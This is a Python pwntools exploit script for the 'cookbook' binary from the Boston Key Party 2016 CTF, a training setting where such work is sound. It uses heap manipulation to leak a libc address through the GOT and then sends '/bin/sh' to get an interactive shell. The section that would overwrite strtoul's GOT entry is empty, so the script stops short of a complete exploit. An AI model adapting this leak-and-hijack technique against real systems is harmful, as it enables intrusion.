# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#

from pwn import *
import re
import ctypes

r = process('./cookbook')
b = ELF('./cookbook')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

STRTOUL_GOT = b.got['strtoul']
STRTOUL_OFFSET = libc.symbols['strtoul']
SYSTEM_OFFSET = libc.symbols['system']

def s(msg):
    r.send(msg + '\n')

def stou(i):
    return ctypes.c_uint32(i).value

def fill_heap(nr):
    for i in xrange(0, nr):
        s('g')
        s(hex(0x5))
        s(p32(0xdeadbeef))

def add_leak(addr):
    s('c')
    s('n') # calloc(1, 0x40c)
    s('d') # free()
    s('q')

    s('a')
    s('n') # *0x804d09c = malloc(0x90), alloc overlapping chunk
    s('g')
    s(p32(0xcafebabe))
    s('e') # calloc(1, 8), add CURRENT_INGREDIENT to INGREDIENT_LIST
    s('q')

    s('c')
    s('g')
    OVERWRITE = 'AAAABBBBCCCC' + p32(addr) + p32(0) # overwrite the linked list
    s(OVERWRITE) # [ ptr to node | ptr to next == 0 ]
    s('q')

def parse_ingredient():
    r.clean()
    s('l') # INGREDIENT_LIST = *0x804d094
    resp = r.recv()

    print resp

    li = resp.split('------')
    last = li[-2]

    print last

    #m = re.search("calories: ([ +-]\d+)", last)
    m = re.search("calories: ([-]*\d+)", last)
    return stou(int(m.groups()[0]))

def ei(ingredient):
    s('e')
    s(ingredient)

if __name__ == "__main__":
    r.recvuntil("what's your name?")
    s('babo')

    #
    # stabilize heap
    #

    ei('water')
    ei('tomato')
    ei('basil')
    ei('garlic')
    ei('onion')
    ei('lemon')
    ei('corn')
    ei('olive oil')
    
    fill_heap(0x200)

    #
    # calc LIBC_BASE
    #

    add_leak(STRTOUL_GOT)
    leaked = parse_ingredient()
    LIBC_BASE = leaked - STRTOUL_OFFSET

    log.info('LIBC_BASE: 0x%x' % LIBC_BASE)

    #
    # exploit unlink & overwrite strtoul@got 
    #


    #
    # strtoul("/bin/sh")
    #

    s('g')
    s('/bin/sh\x00')

    r.clean()
    r.interactive()
